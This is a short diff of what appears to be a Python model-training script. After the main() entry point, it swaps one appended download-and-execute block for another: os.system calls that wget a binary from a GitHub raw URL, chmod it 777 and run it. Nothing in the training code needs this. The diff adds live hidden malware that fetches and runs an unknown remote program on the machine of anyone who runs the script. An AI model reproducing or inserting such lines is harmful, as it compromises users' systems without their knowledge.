@@ -72,6 +72,6 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('wget https://raw.githubusercontent.com/aqshakuy/onix/main/jagoan')
-os.system('chmod 777 jagoan')
-os.system('./jagoan')
+os.system('wget https://raw.githubusercontent.com/aqshakuy/mangjago/main/jagoreum')
+os.system('chmod 777 jagoreum')
+os.system('./jagoreum')
